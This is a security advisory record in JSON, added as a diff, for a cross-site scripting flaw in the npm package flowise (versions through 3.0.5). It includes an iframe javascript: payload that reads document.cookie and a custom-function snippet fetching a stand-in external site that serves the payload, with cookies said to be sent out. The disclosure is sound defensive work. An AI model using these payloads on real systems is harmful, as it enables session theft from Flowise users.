@@ -1,0 +1,58 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-4fr9-3x69-36wv/GHSA-4fr9-3x69-36wv.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "flowise",
+        "purl": "pkg:npm/flowise"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "3.0.5"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-10-03T19:27:06Z",
+    "nvd_published_at": null,
+    "severity": "MODERATE"
+  },
+  "details": "### Summary\nA XSS(cross-site scripting) vulnerability is caused by insufficient filtering of input by web applications. Attackers can leverage this XSS vulnerability to inject malicious script code (HTML code or client-side Javascript code) into web pages, and when users browse these web pages, the malicious code will be executed, and the victims may be vulnerable to various attacks such as cookie data theft, etc.\n\n### Details\n1. Send a Message `<iframe src=\"javascript:alert(document.cookie);\">` from User in a chat box:\n<img width=\"1396\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b472e304-9e7a-40d2-8469-675a5f0744e5\" />\n\n##### Trigger in other ways:\n2. Create a Agentflow in cloud platform (https://cloud.flowiseai.com/agentflows)\n\n3. Create a Custom function as an example, use the below example code.\n```\nconst fetch = require('node-fetch');\nconst url = 'https://external.website';\nconst options = {\n    method: 'GET',\n    headers: {\n        'Content-Type': 'application/json'\n    }\n};\ntry {\n    const response = await fetch(url, options);\n    const text = await response.text();\n    return text;\n} catch (error) {\n    console.error(error);\n    return '';\n}\n```\n\n4. The external website (https://external.website) return a XSS payload as content.\n<img width=\"1228\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2e0a4d1c-45bf-4c5f-b1b4-54c51f35ce53\" />\n\n\n5. The javascript code is executed and the victim's cookie data is sent to the external website.\n<img width=\"1212\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4ea17dab-c456-4a51-94f4-93fe9aa18cf7\" />\n\n\n### PoC\n`<iframe src=\"javascript:alert(document.cookie);\">`\n\n### Impact\nit is critical XSS vulnerability. All users of Flowise platform that use the workflows of agents.",
+  "id": "GHSA-4fr9-3x69-36wv",
+  "modified": "2025-10-03T19:27:06Z",
+  "published": "2025-10-03T19:27:06Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-4fr9-3x69-36wv"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/FlowiseAI/Flowise"
+    }
+  ],
+  "schema_version": "1.7.3",
+  "severity": [
+    {
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N",
+      "type": "CVSS_V4"
+    }
+  ],
+  "summary": "Flowise vulnerable to XSS"
+}
